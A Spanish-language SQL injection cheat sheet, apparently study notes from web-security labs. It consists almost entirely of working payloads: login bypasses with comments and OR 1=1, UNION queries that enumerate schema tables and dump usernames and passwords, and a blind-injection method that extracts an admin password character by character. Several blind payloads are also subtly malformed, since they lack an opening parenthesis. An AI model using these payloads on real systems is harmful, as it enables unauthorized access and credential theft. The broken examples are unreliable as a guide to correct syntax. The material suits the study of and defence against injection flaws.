# SQL INJECTION

## IDENTIFICAR LA VULNERABILIDAD

' | *simbolo comun para testear si existe SQLi o no.*

" | *simbolo comun para testear si existe SQLi o no.*

' -- | *simbolo comun para testear si existe SQLi o no.*

## COMENTARIOS "bypass"

-- | *dentro del lenguaje de SQL query, sirve para comentar de manera que todo lo que este despues de los simbolos, se ignora.* \
ex: SELECT [columns] FROM products WHERE category = 'Gifts'--' AND released = 1

'#' | *dentro del lenguaje de SQL query "#", sirve para comentar de manera que todo lo que este despues del simbolo, se ignora.* \
ex: SELECT [columns] FROM products WHERE category = 'Gifts'#' AND released = 1

## LOGIC BYPASS 

' OR 1=1-- | *sirve para crear una consulta a un resultado booleano, de manera que el inicio de la consulta es leido, el resto no ya que
es siempre TRUE.* \
ex: SELECT [columns] FROM products WHERE category = 'Gifts' OR 1=1-- AND released = 1

USER-- | *cuando se tiene un usuario se podria probar la vulnerabilidad tratando de ver si hace bypass sin ingresar la contrasena.*

## UNION ATTACK

**PRE-REQ:** *numero de columnas y data type de cada columna*

#### COMO SABER EL NUMERO DE COLUMNAS ?

**METODO_1:** ' ORDER BY 1-- \
**METODO_2:** ' UNION SELECT NULL--

#### COMO SABER EL DATA TYPE DE UNA COLUMNA ?

> Microsoft, MySQL & PostgreSQL

' UNION SELECT 'a',NULL,NULL,NULL-- \
' UNION SELECT NULL,'a',NULL,NULL-- | >> *se tiene que hacer iterativo cambiando los campos para saber que tipo son.*

> Oracle

' UNION SELECT 'a','a' from DUAL--

#### IDENTIFICAR INFORMACION DEL MOTOR DE BASE DE DATOS [TIPO/VERSION] 

**Microsoft** >> SELECT @@version \
**MySQL** >> SELECT @@version \
**Oracle** >> SELECT banner FROM v$version | SELECT version FROM v$instance \
**PostgreSQL** >> SELECT version() 

#### LISTAR TABLAS DE LA BASE DE DATOS | [[Microsoft](https://learn.microsoft.com/en-us/sql/relational-databases/system-information-schema-views/tables-transact-sql?view=sql-server-ver16) | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-schema-table-reference.html) | [PostgreSQL](https://www.postgresql.org/docs/current/infoschema-tables.html)] 

'UNION SELECT [columns] FROM information_schema.tables \
'UNION SELECT [columns] FROM information_schema.columns \
'UNION SELECT [columns] FROM information_schema.columns WHERE table_name = 'users_qmwbqm' 

#### LISTAR TABLAS DE LA BASE DE DATOS | [[Oracle](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html)] 

'UNION SELECT [columns] FROM all_tables \
'UNION SELECT [columns] FROM all_tab_columns WHERE table_name = 'USERS' 

#### MOSTRAR INFORMACION DE OTRAS TABLAS 

' UNION SELECT [columns] FROM [table_name]-- \
' UNION SELECT username, password FROM users--

#### MOSTRAR MULTIPLES VALORES EN UNA MISMA COLUMNA [CONCATENACION]

    NOTA: Importante definir la columna que sea formato string.

~: Separador

**ORACLE: ||** \
ex: 'string'||'string' \
' UNION SELECT username || '~' || password FROM users-- 

**MICROSOFT: +** \
ex: 'string'+'string' 

**POSTGRESQL: ||** \
ex: 'string'||'string' 

**MySQL: [ ] "space"** \
ex: 'string' 'string'

## BLIND SQL INJECTION

    NOTA: importante analizar el comportamiento del site. 

1. validar la vulnerabilidad con una consulta booleana
2. validar existencia de tabla
3. validar campos
4. enumerar el tamano del campo (length)
5. enumerar el contenido de un campo (caracteres)

Validar la existencia de una tabla por medio de una consulta booleana, limitando el resultado para no romper la consulta.

' AND SELECT '[value]' FROM [table_name] LIMIT 1)='[value]'--
' AND SELECT 'admin' FROM users LIMIT 1)='[admin]'--

Una vez con el nombre de la tabla, se puede consultar fields especificos cambiando el query y agregando la funcion WHERE:

' AND SELECT [field] FROM [table_name] WHERE [field]='[value]')='[value]'--
' AND SELECT username FROM users WHERE username='admin')='admin'--

_ENUMERAR EL TAMANO DE UN CAMPO ?

' AND SELECT [field_name] FROM [table_name] WHERE [field_name]='[value]' AND LENGTH(field_name)>1)='value'--
' AND SELECT username FROM users WHERE username='admin' AND LENGTH(password)>1)='admin'--

    NOTA: Es necesario iterar el numero de posicion hasta no tener expected responses, de esa manera se obtiene la 
    cantidad de caracteres.

_COMO ENUMERAR EL CONTENIDO "STRING" DE UN CAMPO ?

--> Funcion SUBSTRING

El primer numero, por ejemplo, "4", es la posicion a iterar. el segundo numero es a una sola posicion.

**Oracle:**	SUBSTR('string', 4, 1) \
**Microsoft:**	SUBSTRING('string', 4, 1) \
**PostgreSQL:**	SUBSTRING('string', 4, 1) \
**MySQL:**	SUBSTRING('string', 4, 1)

' AND SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--

    NOTA: Por ejemplo para iterar una posible contrasena se debe cambiar la posicion y el valor final a igual, 
    en este caso el numero "1" y la letra "a".




